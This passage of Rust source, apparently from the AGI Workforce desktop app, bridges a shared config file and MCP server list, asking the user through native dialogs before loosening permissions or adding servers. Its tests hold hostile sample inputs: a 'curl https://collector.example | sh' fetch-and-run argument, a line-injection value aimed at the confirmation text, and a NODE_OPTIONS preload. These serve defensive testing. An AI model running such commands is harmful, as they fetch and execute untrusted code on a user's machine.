//! Bridge to the shared `~/.agiworkforce/config.toml` configuration.
//!
//! The CLI and desktop app share a TOML config file. This module exposes
//! Tauri commands for the frontend to read and write that shared config,
//! enabling unified settings across all AGI Workforce surfaces.

use crate::core::mcp::config::McpServerConfig;
use crate::sys::commands::mcp::McpState;
use crate::sys::native_confirm::{
    check_it_fits, shown_value as marked, ConfirmGate, NativeConfirm,
};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tauri::State;

/// The `default` table of the shared config, as the command-line tool reads
/// it (`DefaultConfig` in `apps/cli/src/config.rs`). What the window sends to
/// be saved there is checked against this shape; [`DEFAULT_SETTINGS`] lists
/// its names.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SharedDefaultConfig {
    #[serde(default)]
    pub model: Option<String>,
    #[serde(default)]
    pub provider: Option<String>,
    #[serde(default)]
    pub stream: Option<bool>,
    #[serde(default)]
    pub max_tokens: Option<u32>,
    #[serde(default)]
    pub temperature: Option<f32>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub fallback_chain: Vec<String>,
    #[serde(default)]
    pub fast_model: Option<String>,
    #[serde(default)]
    pub reasoning_effort: Option<String>,
    #[serde(default)]
    pub keep_history: Option<bool>,
    #[serde(default)]
    pub permission_mode: Option<String>,
    #[serde(default)]
    pub sandbox_mode: Option<String>,
    #[serde(default)]
    pub review_model: Option<String>,
    #[serde(default)]
    pub cloud_model: Option<String>,
    #[serde(default)]
    pub mcp_initialize_timeout: Option<u64>,
    #[serde(default)]
    pub mcp_call_tool_timeout: Option<u64>,
}

/// Returns the path to `~/.agiworkforce/config.toml`.
fn shared_config_path() -> Result<PathBuf, String> {
    let home = dirs::home_dir().ok_or_else(|| "Could not determine home directory".to_string())?;
    Ok(home.join(".agiworkforce").join("config.toml"))
}

/// Read the shared `~/.agiworkforce/config.toml` and return it as JSON.
///
/// Returns `{}` if the file does not exist. Returns an error only on
/// genuine I/O or parse failures, a missing file is not an error.
#[tauri::command]
pub async fn read_shared_config() -> Result<serde_json::Value, String> {
    let config_path = shared_config_path()?;

    if !config_path.exists() {
        return Ok(serde_json::json!({}));
    }

    let content = std::fs::read_to_string(&config_path)
        .map_err(|e| format!("Failed to read config: {}", e))?;
    let config: toml::Value =
        toml::from_str(&content).map_err(|e| format!("Failed to parse config: {}", e))?;

    serde_json::to_value(&config).map_err(|e| format!("Failed to convert to JSON: {}", e))
}

/// The one table of the shared config the window can save, and every
/// setting it holds. Nothing else in the file can be written from the
/// window: `providers.*.base_url` decides where API keys are sent, and is
/// edited in the file itself.
const SHARED_DEFAULT_SECTION: &str = "default";
const DEFAULT_SETTINGS: &[&str] = &[
    "model",
    "provider",
    "stream",
    "max_tokens",
    "temperature",
    "fallback_chain",
    "fast_model",
    "reasoning_effort",
    "keep_history",
    "permission_mode",
    "sandbox_mode",
    "review_model",
    "cloud_model",
    "mcp_initialize_timeout",
    "mcp_call_tool_timeout",
];
const SAVE_LOOSER_SETTINGS_LABEL: &str = "Save Settings";

/// One question about the shared config at a time, and a wait after a no
/// that grows while the noes keep coming, so a loop cannot stack them or
/// wear the user down.
static SHARED_CONFIG_DECISIONS: ConfirmGate = ConfirmGate::new();

/// A setting that decides how much the command-line tool does without
/// asking, and its values from the one that allows least to the one that
/// allows most. Values on one rung allow the same.
struct Posture {
    setting: &'static str,
    label: &'static str,
    /// What the tool does when the setting is absent, where that is known.
    unset: Option<&'static str>,
    ladder: &'static [&'static [&'static str]],
}

/// Values are compared as [`posture_value`] writes them, the way the tool
/// reads them: without case, `-` or `_`.
const POSTURES: &[Posture] = &[
    Posture {
        setting: "permission_mode",
        label: "Permission mode",
        unset: Some("default"),
        ladder: &[
            &["plan"],
            &["default", "ask", "suggest"],
            &["acceptedits", "auto"],
            &["dontask"],
        ],
    },
    Posture {
        setting: "sandbox_mode",
        label: "Sandbox mode",
        unset: None,
        ladder: &[
            &["readonly"],
            &["workspace", "workspacewrite", "contained"],
            &["fullauto"],
            &["off", "dangerfullaccess", "unrestricted"],
        ],
    },
];

fn posture_value(value: &str) -> String {
    value
        .trim()
        .chars()
        .filter(|c| !matches!(c, '-' | '_'))
        .map(|c| c.to_ascii_lowercase())
        .collect()
}

impl Posture {
    fn rung(&self, value: &str) -> Option<usize> {
        let value = posture_value(value);
        self.ladder
            .iter()
            .position(|rung| rung.contains(&value.as_str()))
    }

    /// Whether going from `current` to `requested` lets the tool do more.
    /// A value that is not on the ladder cannot be placed, so moving to one
    /// counts as more and moving off one as less. An absent setting whose
    /// meaning is not known is the least it could be when it is what is
    /// there now, and cannot be placed when it is what is asked for.
    fn loosens(&self, current: Option<&str>, requested: Option<&str>) -> bool {
        let current = current.or(self.unset);
        let requested = requested.or(self.unset);
        if current.map(posture_value) == requested.map(posture_value) {
            return false;
        }
        let Some(requested_rung) = requested.and_then(|value| self.rung(value)) else {
            return true;
        };
        match current {
            None => requested_rung > 0,
            Some(current) => self
                .rung(current)
                .is_some_and(|current_rung| requested_rung > current_rung),
        }
    }
}

/// One setting a save would loosen, as it is and as it would be.
#[derive(Debug, PartialEq, Eq)]
struct Loosening {
    setting: &'static str,
    label: &'static str,
    current: Option<String>,
    requested: Option<String>,
}

type SentSettings = serde_json::Map<String, serde_json::Value>;

/// What the window sent for the `default` table, once every name in it is
/// one of [`DEFAULT_SETTINGS`] and every value has the type the tool reads.
fn validated_defaults(value: &serde_json::Value) -> Result<&SentSettings, String> {
    let sent = value
        .as_object()
        .ok_or_else(|| "The default section must be a table of settings".to_string())?;
    if let Some(unknown) = sent
        .keys()
        .find(|name| !DEFAULT_SETTINGS.contains(&name.as_str()))
    {
        return Err(format!(
            "{} is not a setting of the default section. Edit ~/.agiworkforce/config.toml to \
             change it.",
            marked(unknown)
        ));
    }
    serde_json::from_value::<SharedDefaultConfig>(value.clone())
        .map_err(|e| format!("The default section is not valid: {}", e))?;
    Ok(sent)
}

fn loosenings(current: Option<&toml::Value>, sent: &SentSettings) -> Vec<Loosening> {
    POSTURES
        .iter()
        .filter_map(|posture| {
            let current = current
                .and_then(|section| section.get(posture.setting))
                .and_then(|value| value.as_str());
            let requested = sent.get(posture.setting).and_then(|value| value.as_str());
            posture.loosens(current, requested).then(|| Loosening {
                setting: posture.setting,
                label: posture.label,
                current: current.map(str::to_string),
                requested: requested.map(str::to_string),
            })
        })
        .collect()
}

/// The question for a save that loosens something, naming each setting as
/// it is and as it would be. `Err` when it cannot be shown whole.
fn loosening_question(loosened: &[Loosening]) -> Result<NativeConfirm, String> {
    let shown = |value: &Option<String>| {
        value
            .as_deref()
            .map_or_else(|| "(not set)".to_string(), marked)
    };
    let changes: Vec<String> = loosened
        .iter()
        .map(|change| {
            format!(
                "{} now: {}\n{} after: {}",
                change.label,
                shown(&change.current),
                change.label,
                shown(&change.requested)
            )
        })
        .collect();
    let body = format!(
        "{}\n\nThis is saved to ~/.agiworkforce/config.toml, which the command-line tool reads \
         when it starts. These settings decide what it does on this computer without asking \
         you first, and this change lets it do more.",
        changes.join("\n\n")
    );
    check_it_fits(&body).map_err(|rows| {
        format!(
            "These settings are too long to show in one confirmation ({rows} rows), so nothing \
             was saved."
        )
    })?;
    Ok(NativeConfirm {
        title: "Let the command-line tool do more without asking?".to_string(),
        body,
        confirm_label: SAVE_LOOSER_SETTINGS_LABEL.to_string(),
    })
}

fn loosening_request(loosened: &[Loosening]) -> String {
    loosened
        .iter()
        .map(|change| {
            format!(
                "{}={}",
                change.setting,
                change.requested.as_deref().unwrap_or_default()
            )
        })
        .collect::<Vec<_>>()
        .join("\u{0}")
}

/// Puts what was sent in place of the `default` table and leaves every
/// other table and key of the file as it is. TOML has no null, so a setting
/// sent as null is left out.
fn replace_defaults(table: &mut toml::Table, sent: &SentSettings) -> Result<(), String> {
    let mut section = toml::Table::new();
    for (name, value) in sent {
        if !value.is_null() {
            section.insert(name.clone(), json_to_toml(value)?);
        }
    }
    table.insert(
        SHARED_DEFAULT_SECTION.to_string(),
        toml::Value::Table(section),
    );
    Ok(())
}

/// Saves the `default` table of `~/.agiworkforce/config.toml`, and no other
/// part of the file. A save that makes the permission or sandbox mode allow
/// more is written only after the user's yes in a dialog the operating
/// system draws, which names each as it is and as it would be; `false`
/// means the user declined and nothing was written. A save that leaves them
/// as they are, or tightens them, never asks.
#[tauri::command]
pub async fn write_shared_config(
    app: tauri::AppHandle,
    key: String,
    value: serde_json::Value,
) -> Result<bool, String> {
    if key != SHARED_DEFAULT_SECTION {
        return Err(format!(
            "Only the {SHARED_DEFAULT_SECTION} section of config.toml can be saved from this \
             app. Edit the file for anything else."
        ));
    }
    let sent = validated_defaults(&value)?;
    let config_path = shared_config_path()?;

    // Ensure the directory exists.
    if let Some(parent) = config_path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| format!("Failed to create config directory: {}", e))?;
    }

    // Read existing config or start fresh.
    let mut table: toml::Table = if config_path.exists() {
        let content = std::fs::read_to_string(&config_path)
            .map_err(|e| format!("Failed to read existing config: {}", e))?;
        toml::from_str(&content).map_err(|e| format!("Failed to parse existing config: {}", e))?
    } else {
        toml::Table::new()
    };

    let loosened = loosenings(table.get(SHARED_DEFAULT_SECTION), sent);
    if !loosened.is_empty() {
        let question = loosening_question(&loosened)?;
        let allowed = SHARED_CONFIG_DECISIONS
            .confirm(&app, &loosening_request(&loosened), question)
            .await
            .map_err(|held| held.message())?;
        if !allowed {
            tracing::info!(
                "[Dotfile] Loosening the shared config was declined in the native dialog"
            );
            return Ok(false);
        }
    }

    replace_defaults(&mut table, sent)?;
    let output =
        toml::to_string_pretty(&table).map_err(|e| format!("Failed to serialize config: {}", e))?;
    std::fs::write(&config_path, output).map_err(|e| format!("Failed to write config: {}", e))?;

    Ok(true)
}

// ---------------------------------------------------------------------------
// Dotfile path helpers
// ---------------------------------------------------------------------------

/// Returns the path to `~/.agiworkforce/`.
fn dotfile_root() -> Result<PathBuf, String> {
    let home = dirs::home_dir().ok_or_else(|| "Could not determine home directory".to_string())?;
    Ok(home.join(".agiworkforce"))
}

/// Returns the path to `~/.agiworkforce/mcp.json`.
fn mcp_json_path() -> Result<PathBuf, String> {
    Ok(dotfile_root()?.join("mcp.json"))
}

// ---------------------------------------------------------------------------
// MCP server management
// ---------------------------------------------------------------------------

/// List all MCP servers from `~/.agiworkforce/mcp.json`.
///
/// Returns the `mcpServers` object (or `{}` if the file does not exist).
#[tauri::command]
pub async fn dotfile_list_mcp_servers() -> Result<serde_json::Value, String> {
    let path = mcp_json_path()?;
    if !path.exists() {
        return Ok(serde_json::json!({}));
    }
    let content =
        std::fs::read_to_string(&path).map_err(|e| format!("Failed to read mcp.json: {}", e))?;
    let parsed: serde_json::Value =
        serde_json::from_str(&content).map_err(|e| format!("Failed to parse mcp.json: {}", e))?;
    Ok(parsed
        .get("mcpServers")
        .cloned()
        .unwrap_or(serde_json::json!({})))
}

const ADD_SERVER_LABEL: &str = "Add Server";
const MAX_SERVER_NAME_CHARS: usize = 64;
const ENVIRONMENT_VALUE_NOT_SHOWN: &str = "(a credential, not shown)";

/// One question about adding a shared server at a time, and a wait after a
/// no that grows while the noes keep coming.
static SHARED_SERVER_DECISIONS: ConfirmGate = ConfirmGate::new();

/// A server as the window can add it: a command, its arguments and its
/// environment, which is what the dialog shows. An entry with anything
/// more, a URL, headers or a sandbox switch, is written in the file itself.
#[derive(Debug, PartialEq, Eq)]
struct SharedServerEntry {
    name: String,
    command: String,
    args: Vec<String>,
    env: std::collections::BTreeMap<String, String>,
}

impl SharedServerEntry {
    fn parse(name: &str, config: &serde_json::Value) -> Result<Self, String> {
        let name = name.trim();
        if name.is_empty() || name.chars().count() > MAX_SERVER_NAME_CHARS || marked(name) != name {
            return Err(format!(
                "A server name is 1 to {MAX_SERVER_NAME_CHARS} visible characters on one line"
            ));
        }
        let sent = config
            .as_object()
            .ok_or_else(|| "A server entry must be an object".to_string())?;
        if let Some(other) = sent
            .keys()
            .find(|key| !matches!(key.as_str(), "command" | "args" | "env"))
        {
            return Err(format!(
                "Only a command, its arguments and its environment can be added here, not {}. \
                 Edit ~/.agiworkforce/mcp.json for anything else.",
                marked(other)
            ));
        }
        let server: McpServerConfig = serde_json::from_value(config.clone())
            .map_err(|e| format!("This is not a server entry: {}", e))?;
        let command = server.command.trim();
        if command.is_empty() {
            return Err("A server needs a command to start it".to_string());
        }
        if let Some(variable) = server
            .env
            .keys()
            .find(|variable| variable.is_empty() || marked(variable) != **variable)
        {
            return Err(format!(
                "{} cannot name an environment variable",
                marked(variable)
            ));
        }
        Ok(Self {
            name: name.to_string(),
            command: command.to_string(),
            args: server.args,
            env: server.env.into_iter().collect(),
        })
    }

    fn shown_arguments(&self) -> String {
        if self.args.is_empty() {
            return "none".to_string();
        }
        self.args
            .iter()
            .map(|arg| marked(arg))
            .collect::<Vec<_>>()
            .join(" \u{b7} ")
    }

    /// Each variable as the launch policy shows it: a credential by name is
    /// never shown, and an address is shown without what signs in to it.
    fn shown_environment(&self) -> String {
        if self.env.is_empty() {
            return "nothing added".to_string();
        }
        self.env
            .iter()
            .map(|(variable, value)| {
                let value = match agiworkforce_sandbox_policy::shown_value(variable, value) {
                    Some(shown) => marked(&shown),
                    None => ENVIRONMENT_VALUE_NOT_SHOWN.to_string(),
                };
                format!("{variable}={value}")
            })
            .collect::<Vec<_>>()
            .join("; ")
    }

    /// The question, showing the whole launch. `Err` for a launch one
    /// dialog cannot show: a yes to what was not shown is not consent.
    fn question(&self, replaces: bool) -> Result<NativeConfirm, String> {
        let replacing = if replaces {
            " It replaces the server of that name that is in the file now."
        } else {
            ""
        };
        let body = format!(
            "Name: {}\nCommand: {}\nArguments ({}): {}\nEnvironment: {}\n\nThis is saved to \
             ~/.agiworkforce/mcp.json.{replacing} The command-line tool starts it as you, with \
             your full user rights and outside its sandbox, the next time it runs. This app \
             lists it switched off.\n\nNothing is saved unless you choose {ADD_SERVER_LABEL}.",
            self.name,
            marked(&self.command),
            self.args.len(),
            self.shown_arguments(),
            self.shown_environment()
        );
        check_it_fits(&body).map_err(|rows| {
            format!(
                "This server is too large to show whole in one confirmation ({rows} rows), so \
                 nothing was saved. Shorten its command, arguments or environment, or add it in \
                 ~/.agiworkforce/mcp.json."
            )
        })?;
        Ok(NativeConfirm {
            title: "Add this server for the command-line tool?".to_string(),
            body,
            confirm_label: ADD_SERVER_LABEL.to_string(),
        })
    }

    /// What identifies this exact launch, so that a no to it is counted
    /// against it and not against a different one.
    fn request(&self) -> String {
        format!(
            "{}\u{0}{}\u{0}{:?}\u{0}{:?}",
            self.name, self.command, self.args, self.env
        )
    }

    fn entry(&self) -> serde_json::Value {
        let mut entry = serde_json::json!({ "command": self.command, "args": self.args });
        if !self.env.is_empty() {
            entry["env"] = serde_json::json!(self.env);
        }
        entry
    }
}

/// Adds a server entry to `~/.agiworkforce/mcp.json`, or puts one in place
/// of the entry of that name.
///
/// Creates the file with a `{ "mcpServers": {} }` skeleton when missing.
///
/// The command-line tool starts what this file names as the user's own
/// server, outside its sandbox, so the entry is written only after the
/// user's yes in a dialog the operating system draws, which shows the whole
/// launch. `false` means the user declined and nothing was written.
///
/// After writing, reloads the live MCP client so the new server is listed
/// here at once, switched off (`McpServersConfig::merge_dotfile_servers`).
#[tauri::command]
pub async fn dotfile_add_mcp_server(
    mcp_state: State<'_, McpState>,
    app: tauri::AppHandle,
    name: String,
    config: serde_json::Value,
) -> Result<bool, String> {
    let entry = SharedServerEntry::parse(&name, &config)?;
    let path = mcp_json_path()?;

    // Ensure the directory exists.
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| format!("Failed to create dotfile directory: {}", e))?;
    }

    let mut root = if path.exists() {
        let content = std::fs::read_to_string(&path)
            .map_err(|e| format!("Failed to read mcp.json: {}", e))?;
        serde_json::from_str::<serde_json::Value>(&content)
            .map_err(|e| format!("Failed to parse mcp.json: {}", e))?
    } else {
        serde_json::json!({ "mcpServers": {} })
    };

    let servers = root
        .as_object_mut()
        .ok_or_else(|| "mcp.json root is not an object".to_string())?
        .entry("mcpServers")
        .or_insert_with(|| serde_json::json!({}));

    let servers_map = servers
        .as_object_mut()
        .ok_or_else(|| "mcpServers is not an object".to_string())?;

    let question = entry.question(servers_map.contains_key(&entry.name))?;
    let allowed = SHARED_SERVER_DECISIONS
        .confirm(&app, &entry.request(), question)
        .await
        .map_err(|held| held.message())?;
    if !allowed {
        tracing::info!("[Dotfile] Adding a shared MCP server was declined in the native dialog");
        return Ok(false);
    }

    servers_map.insert(entry.name.clone(), entry.entry());

    let output = serde_json::to_string_pretty(&root)
        .map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
    std::fs::write(&path, output).map_err(|e| format!("Failed to write mcp.json: {}", e))?;

    mcp_state.reload_active_config(&app).await?;
    Ok(true)
}

/// Remove a server from `~/.agiworkforce/mcp.json`.
///
/// After removing, reloads the live MCP client so a server that was only
/// declared in the dotfile is disconnected immediately (see
/// `dotfile_add_mcp_server` for why this reload is necessary).
#[tauri::command]
pub async fn dotfile_remove_mcp_server(
    mcp_state: State<'_, McpState>,
    app: tauri::AppHandle,
    name: String,
) -> Result<(), String> {
    let path = mcp_json_path()?;
    if !path.exists() {
        return Ok(());
    }

    let content =
        std::fs::read_to_string(&path).map_err(|e| format!("Failed to read mcp.json: {}", e))?;
    let mut root: serde_json::Value =
        serde_json::from_str(&content).map_err(|e| format!("Failed to parse mcp.json: {}", e))?;

    if let Some(servers) = root.get_mut("mcpServers").and_then(|v| v.as_object_mut()) {
        servers.remove(&name);
    }

    let output = serde_json::to_string_pretty(&root)
        .map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
    std::fs::write(&path, output).map_err(|e| format!("Failed to write mcp.json: {}", e))?;

    mcp_state.reload_active_config(&app).await?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Skills discovery
// ---------------------------------------------------------------------------

/// Scan `~/.agiworkforce/skills/` for `SKILL.md` files.
///
/// Returns a vec of `{ name, description, path, source }` objects.
#[tauri::command]
pub async fn dotfile_list_skills() -> Result<Vec<serde_json::Value>, String> {
    let skills_dir = dotfile_root()?.join("skills");
    if !skills_dir.is_dir() {
        return Ok(Vec::new());
    }

    let pattern = skills_dir.join("*").join("SKILL.md");
    let entries = glob::glob(&pattern.to_string_lossy())
        .map_err(|e| format!("Glob error: {}", e))?
        .filter_map(|r| r.ok())
        .collect::<Vec<_>>();

    let mut skills = Vec::new();
    for path in entries {
        let folder = path
            .parent()
            .and_then(|p| p.file_name())
            .and_then(|n| n.to_str())
            .unwrap_or("unknown")
            .to_string();

        // Extract the first line as description (skip leading `# ` header).
        let content = std::fs::read_to_string(&path).unwrap_or_default();
        let description = content
            .lines()
            .find(|l| !l.trim().is_empty())
            .map(|l| l.trim_start_matches('#').trim().to_string())
            .unwrap_or_default();

        skills.push(serde_json::json!({
            "name": folder,
            "description": description,
            "path": path.to_string_lossy(),
            "source": "system",
        }));
    }

    Ok(skills)
}

// ---------------------------------------------------------------------------
// Instructions file
// ---------------------------------------------------------------------------

const INSTRUCTIONS_FILE: &str = "INSTRUCTIONS.md";

/// The text of `~/.agiworkforce/INSTRUCTIONS.md` for the chat prompt, or
/// `None` when the file is missing, unreadable or blank.
pub fn load_instructions_file() -> Option<String> {
    let text = std::fs::read_to_string(dotfile_root().ok()?.join(INSTRUCTIONS_FILE)).ok()?;
    let text = text.trim();
    (!text.is_empty()).then(|| text.to_string())
}

/// Read `~/.agiworkforce/INSTRUCTIONS.md`.
///
/// Returns an empty string if the file does not exist.
#[tauri::command]
pub async fn dotfile_read_instructions() -> Result<String, String> {
    let path = dotfile_root()?.join(INSTRUCTIONS_FILE);
    if !path.exists() {
        return Ok(String::new());
    }
    std::fs::read_to_string(&path).map_err(|e| format!("Failed to read INSTRUCTIONS.md: {}", e))
}

/// Write `~/.agiworkforce/INSTRUCTIONS.md`.
#[tauri::command]
pub async fn dotfile_write_instructions(content: String) -> Result<(), String> {
    let root = dotfile_root()?;
    std::fs::create_dir_all(&root)
        .map_err(|e| format!("Failed to create dotfile directory: {}", e))?;
    let path = root.join(INSTRUCTIONS_FILE);
    std::fs::write(&path, content)
        .map_err(|e| format!("Failed to write INSTRUCTIONS.md: {}", e))?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Memory viewer
// ---------------------------------------------------------------------------

/// Read `~/.agiworkforce/memories/raw_memories.md`.
///
/// Returns an empty string if the file does not exist.
#[tauri::command]
pub async fn dotfile_read_memories() -> Result<String, String> {
    let path = dotfile_root()?.join("memories").join("raw_memories.md");
    if !path.exists() {
        return Ok(String::new());
    }
    std::fs::read_to_string(&path).map_err(|e| format!("Failed to read raw_memories.md: {}", e))
}

// ---------------------------------------------------------------------------
// JSON → TOML helpers
// ---------------------------------------------------------------------------

/// Convert a `serde_json::Value` into a `toml::Value`.
///
/// TOML doesn't support null, so nulls are dropped. Arrays of mixed
/// types are serialized via the JSON string roundtrip as a fallback.
fn json_to_toml(json: &serde_json::Value) -> Result<toml::Value, String> {
    match json {
        serde_json::Value::Null => {
            // TOML has no null, use empty string as a placeholder.
            Ok(toml::Value::String(String::new()))
        }
        serde_json::Value::Bool(b) => Ok(toml::Value::Boolean(*b)),
        serde_json::Value::Number(n) => {
            if let Some(i) = n.as_i64() {
                Ok(toml::Value::Integer(i))
            } else if let Some(f) = n.as_f64() {
                Ok(toml::Value::Float(f))
            } else {
                Err(format!("Unsupported number: {}", n))
            }
        }
        serde_json::Value::String(s) => Ok(toml::Value::String(s.clone())),
        serde_json::Value::Array(arr) => {
            let items: Result<Vec<toml::Value>, String> = arr.iter().map(json_to_toml).collect();
            Ok(toml::Value::Array(items?))
        }
        serde_json::Value::Object(map) => {
            let mut table = toml::Table::new();
            for (k, v) in map {
                table.insert(k.clone(), json_to_toml(v)?);
            }
            Ok(toml::Value::Table(table))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config(text: &str) -> toml::Table {
        toml::from_str(text).expect("config")
    }

    fn sent(value: serde_json::Value) -> SentSettings {
        value.as_object().expect("an object").clone()
    }

    #[test]
    fn the_setting_names_are_the_ones_the_default_table_has() {
        let every_setting = SharedDefaultConfig {
            model: Some("m".to_string()),
            provider: Some("p".to_string()),
            stream: Some(true),
            max_tokens: Some(1),
            temperature: Some(0.5),
            fallback_chain: vec!["f".to_string()],
            fast_model: Some("m".to_string()),
            reasoning_effort: Some("low".to_string()),
            keep_history: Some(true),
            permission_mode: Some("plan".to_string()),
            sandbox_mode: Some("read-only".to_string()),
            review_model: Some("m".to_string()),
            cloud_model: Some("m".to_string()),
            mcp_initialize_timeout: Some(30),
            mcp_call_tool_timeout: Some(120),
        };
        let written = serde_json::to_value(&every_setting).expect("serialise");
        let mut named: Vec<&str> = written
            .as_object()
            .expect("a table")
            .keys()
            .map(String::as_str)
            .collect();
        named.sort_unstable();
        let mut listed = DEFAULT_SETTINGS.to_vec();
        listed.sort_unstable();

        assert_eq!(named, listed);
        assert!(validated_defaults(&written).is_ok());
        for posture in POSTURES {
            assert!(DEFAULT_SETTINGS.contains(&posture.setting));
        }
    }

    #[test]
    fn what_the_window_sends_must_be_settings_of_the_default_table() {
        for refused in [
            serde_json::json!({ "model": "m", "base_url": "https://collector.example" }),
            serde_json::json!({ "providers": { "anthropic": { "base_url": "https://x.example" } } }),
            serde_json::json!({ "model": 7 }),
            serde_json::json!({ "permission_mode": ["dontAsk"] }),
            serde_json::json!({ "keep_history": "yes" }),
            serde_json::json!({ "approval_mode": "full-auto" }),
            serde_json::json!("default"),
        ] {
            assert!(
                validated_defaults(&refused).is_err(),
                "{refused} was accepted"
            );
        }
        assert!(validated_defaults(&serde_json::json!({})).is_ok());
    }

    #[test]
    fn only_a_change_that_allows_more_is_asked_about() {
        let permission = &POSTURES[0];
        let sandbox = &POSTURES[1];

        for (posture, current, requested, asks) in [
            (permission, Some("plan"), Some("plan"), false),
            (permission, Some("default"), Some("Default"), false),
            (permission, Some("default"), None, false),
            (permission, Some("default"), Some("accept_edits"), true),
            (permission, Some("acceptEdits"), Some("dont-ask"), true),
            (permission, None, Some("dontAsk"), true),
            (permission, Some("dontAsk"), Some("default"), false),
            (permission, Some("dontAsk"), None, false),
            (permission, Some("default"), Some("yolo"), true),
            (permission, Some("yolo"), Some("default"), false),
            (permission, Some("yolo"), Some("yolo"), false),
            (permission, Some("yolo"), Some("other"), true),
            (permission, None, Some("default"), false),
            (permission, Some("plan"), Some("default"), true),
            (permission, None, Some("acceptEdits"), true),
            (permission, Some("accept-edits"), Some("plan"), false),
            (permission, Some("default"), Some("bypassPermissions"), true),
            (sandbox, Some("read-only"), Some("workspace"), true),
            (sandbox, Some("workspace-write"), Some("read-only"), false),
            (sandbox, Some("workspace"), Some("off"), true),
            (sandbox, None, Some("read-only"), false),
            (sandbox, None, Some("workspace"), true),
            (sandbox, None, None, false),
            (sandbox, Some("read-only"), None, true),
        ] {
            assert_eq!(
                posture.loosens(current, requested),
                asks,
                "{}: {current:?} to {requested:?}",
                posture.setting
            );
        }
    }

    #[test]
    fn the_question_names_each_setting_as_it_is_and_as_it_would_be() {
        let table = config("[default]\npermission_mode = \"plan\"\nsandbox_mode = \"read-only\"\n");
        let loosened = loosenings(
            table.get("default"),
            &sent(serde_json::json!({
                "model": "new",
                "permission_mode": "dontAsk\nSandbox mode after: read-only",
                "sandbox_mode": "off",
            })),
        );

        assert_eq!(loosened.len(), 2);
        let question = loosening_question(&loosened).expect("question");
        assert_eq!(question.confirm_label, "Save Settings");
        assert!(crate::sys::native_confirm::can_ask_with(
            &question.confirm_label
        ));
        assert!(question
            .body
            .contains("Permission mode now: plan\nPermission mode after: "));
        assert!(question
            .body
            .contains("Sandbox mode now: read-only\nSandbox mode after: off"));
        assert_eq!(
            question.body.matches("\nSandbox mode after: ").count(),
            1,
            "a value must not be able to add a line of its own to the question"
        );
        assert!(loosening_request(&loosened).contains("sandbox_mode=off"));

        assert!(loosenings(
            table.get("default"),
            &sent(serde_json::json!({
                "model": "new",
                "permission_mode": "plan",
                "sandbox_mode": "read-only",
            }))
        )
        .is_empty());
        assert_eq!(
            loosenings(
                None,
                &sent(serde_json::json!({ "permission_mode": "dontAsk" }))
            ),
            vec![Loosening {
                setting: "permission_mode",
                label: "Permission mode",
                current: None,
                requested: Some("dontAsk".to_string()),
            }]
        );
        let endless = vec![Loosening {
            setting: "permission_mode",
            label: "Permission mode",
            current: None,
            requested: Some("x".repeat(4000)),
        }];
        assert!(loosening_question(&endless).is_err());
    }

    #[test]
    fn a_save_replaces_the_default_table_and_nothing_else() {
        let mut table = config(
            "[default]\nmodel = \"old\"\nstream = true\n\n\
             [providers.anthropic]\nbase_url = \"https://api.example\"\n\n[ui]\ntheme = \"dark\"\n",
        );

        replace_defaults(
            &mut table,
            &sent(serde_json::json!({
                "model": "new",
                "max_tokens": 4096,
                "fast_model": null,
                "fallback_chain": ["a", "b"],
            })),
        )
        .expect("replace");

        assert_eq!(table["default"]["model"].as_str(), Some("new"));
        assert_eq!(table["default"]["max_tokens"].as_integer(), Some(4096));
        assert!(table["default"].get("stream").is_none());
        assert!(table["default"].get("fast_model").is_none());
        assert_eq!(
            table["providers"]["anthropic"]["base_url"].as_str(),
            Some("https://api.example")
        );
        assert_eq!(table["ui"]["theme"].as_str(), Some("dark"));
    }

    #[test]
    fn a_shared_server_is_a_command_its_arguments_and_its_environment() {
        let entry = SharedServerEntry::parse(
            " files ",
            &serde_json::json!({
                "command": "npx",
                "args": ["-y", "files-mcp"],
                "env": { "LOG_LEVEL": "debug" }
            }),
        )
        .expect("entry");

        assert_eq!(entry.name, "files");
        assert_eq!(
            entry.entry(),
            serde_json::json!({
                "command": "npx",
                "args": ["-y", "files-mcp"],
                "env": { "LOG_LEVEL": "debug" }
            })
        );
        assert_eq!(
            SharedServerEntry::parse("files", &serde_json::json!({ "command": "npx" }))
                .expect("entry")
                .entry(),
            serde_json::json!({ "command": "npx", "args": [] })
        );

        for refused in [
            serde_json::json!({ "command": "npx", "sandbox": false }),
            serde_json::json!({ "command": "npx", "allowLocalNetwork": true }),
            serde_json::json!({ "url": "https://mcp.example/sse" }),
            serde_json::json!({ "command": "npx", "transport": { "type": "http", "url": "https://mcp.example" } }),
            serde_json::json!({ "command": "  " }),
            serde_json::json!({ "command": "npx", "args": "-y files-mcp" }),
            serde_json::json!({ "command": "npx", "args": ["-y", 7] }),
            serde_json::json!({ "command": "npx", "env": { "TWO\nLINES": "x" } }),
            serde_json::json!({ "command": "npx", "env": { "COUNT": 3 } }),
            serde_json::json!("npx"),
        ] {
            assert!(
                SharedServerEntry::parse("files", &refused).is_err(),
                "{refused} was accepted"
            );
        }
        let too_long = "n".repeat(MAX_SERVER_NAME_CHARS + 1);
        for name in ["", "   ", "two\nlines", too_long.as_str()] {
            assert!(
                SharedServerEntry::parse(name, &serde_json::json!({ "command": "npx" })).is_err(),
                "{name:?} was accepted as a name"
            );
        }
    }

    #[test]
    fn the_question_shows_the_whole_launch_and_no_credential() {
        let entry = SharedServerEntry::parse(
            "files",
            &serde_json::json!({
                "command": "sh",
                "args": ["-c", "curl https://collector.example | sh\nEnvironment: nothing added"],
                "env": {
                    "API_TOKEN": "sk-not-for-the-screen",
                    "DATABASE_URL": "postgres://app:EXAMPLE@db.example.com/main",
                    "NODE_OPTIONS": "--require ./preload.js"
                }
            }),
        )
        .expect("entry");

        let question = entry.question(true).expect("question");

        assert_eq!(question.confirm_label, "Add Server");
        assert!(crate::sys::native_confirm::can_ask_with(
            &question.confirm_label
        ));
        assert!(question
            .body
            .starts_with("Name: files\nCommand: sh\nArguments (2): -c \u{b7} "));
        assert!(question
            .body
            .contains("curl https://collector.example | sh"));
        assert_eq!(
